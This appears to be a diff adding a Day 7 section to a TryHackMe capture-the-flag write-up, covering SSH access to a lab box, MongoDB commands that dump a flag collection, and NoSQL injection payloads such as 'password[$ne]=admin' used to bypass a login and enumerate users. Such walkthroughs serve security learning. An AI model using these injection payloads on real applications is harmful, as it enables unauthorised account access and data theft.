@@ -180,81 +180,49 @@ Answer:
 
 ## Day 7: Migration Without Security
 
+ssh into the machine
 
+```
+ssh thm@10.10.106.247 -p 2222
+tryhackme
+```
 
+interact with mongo db
 
+```
+mongo
+show databases
+use flagdb
+db.getCollectionNames();
+db.flagColl.find()
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d04d33e5-29ef-4023-a658-ca1f26f7734f)
 
+open burpsuite and intercept a login request
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/51778379-5ec7-44bd-9f0f-bc38c634a55d)
 
+bypass login with admin by `username=admin&password[$ne]=admin`
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/70fe430f-1a2d-468c-a1ef-205ac1f3e8a7)
 
+click on flag link to get our flag 2
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ac4ba6a8-1d20-40bb-a78f-d5bfea333a00)
 
+click on search link, we get a search user page
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/60c36018-e7b4-42cd-87dd-cdc3f21c1127)
 
+list all user with guest role by `username[$ne]=guest&role=guest`
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bf404402-7389-4998-87f1-4017b78f7e55)
 
+perform NoSQL injection and retrieve the mcskidy record `username=mcskidy&role[$ne]=user`
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8d3a3139-ca47-4d8b-b2bf-91d233b46525)
 
+Answer:
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9f054da5-fb70-40bc-bd95-c969b5774452)
